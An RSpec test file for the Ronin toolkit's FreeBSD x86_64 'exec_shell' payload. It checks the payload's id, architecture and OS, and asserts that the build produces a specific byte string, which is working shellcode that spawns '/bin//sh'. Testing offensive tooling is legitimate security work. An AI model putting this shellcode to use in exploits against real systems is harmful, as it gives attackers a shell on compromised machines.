require 'spec_helper'
require 'ronin/payloads/builtin/shellcode/freebsd/x86_64/exec_shell'

describe Ronin::Payloads::Shellcode::FreeBSD::X86_64::ExecShell do
  it "must inherit from Ronin::Payloads::Shellcode::ExecShellPayload" do
    expect(described_class).to be < Ronin::Payloads::Shellcode::ExecShellPayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'shellcode/freebsd/x86_64/exec_shell'" do
      expect(subject.id).to eq('shellcode/freebsd/x86_64/exec_shell')
    end
  end

  describe ".arch" do
    subject { described_class }

    it "must equal :x86_64" do
      expect(subject.arch).to be(:x86_64)
    end
  end

  describe ".os" do
    subject { described_class }

    it "must equal :freebsd" do
      expect(subject.os).to be(:freebsd)
    end
  end

  describe "#build" do
    before { subject.build }

    it "must set #payload" do
      expect(subject.payload).to eq(
        "\x48\x31\xc9\x48\xf7\xe1\x04\x3b\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05".b
      )
    end

    it "must ensure #payload is an ASCII 8bit string" do
      expect(subject.payload.encoding).to eq(Encoding::ASCII_8BIT)
    end
  end
end
